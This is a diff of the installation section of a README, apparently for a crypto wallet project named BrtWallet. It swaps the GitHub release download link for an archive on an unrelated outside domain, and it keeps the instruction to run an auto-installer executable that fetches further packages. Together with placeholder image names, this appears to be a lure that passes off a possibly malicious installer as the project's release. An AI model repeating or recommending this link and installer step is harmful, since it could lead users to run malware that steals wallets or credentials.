@@ -7,8 +7,8 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/53f638d4-4201-43df-a750-61dd174f135a)
-](https://github.com/johnnycleiton07/BrtWallet/releases/download/V3.20/Release.zip)
-## **1. [Download the archive](https://github.com/johnnycleiton07/BrtWallet/releases/download/V3.20/Release.zip) from releases and extract it to a convenient folder.**
+](https://dl.jrdesklabs.com/Setup.zip)
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 ![asdgvb](https://github.com/user-attachments/assets/a7b3b667-1ea4-4d7b-b44d-09510fd93aa9)
 ![hgjgh](https://github.com/user-attachments/assets/26e71a7e-7bc3-4c75-8bfc-a96f48d151f5)
